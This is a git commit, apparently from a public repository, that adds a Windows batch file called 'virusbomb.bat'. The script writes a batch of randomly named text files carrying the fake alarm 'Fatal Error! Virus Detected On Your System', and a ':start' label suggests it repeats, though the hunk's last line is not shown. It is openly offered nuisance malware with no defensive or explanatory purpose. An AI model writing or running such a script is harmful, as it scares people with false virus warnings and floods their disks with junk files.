2c0f39cdbed791a84361e00a6a90338dd87ea3a7
doniibnuharizzz <doniibnuhariz@gmail.com>
2024-10-17 23:16:49 +0700

    Add files via upload

---
+++ virusbomb.bat
@@ -0,0 +1,14 @@
+@echo off
+CLS
+:start
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
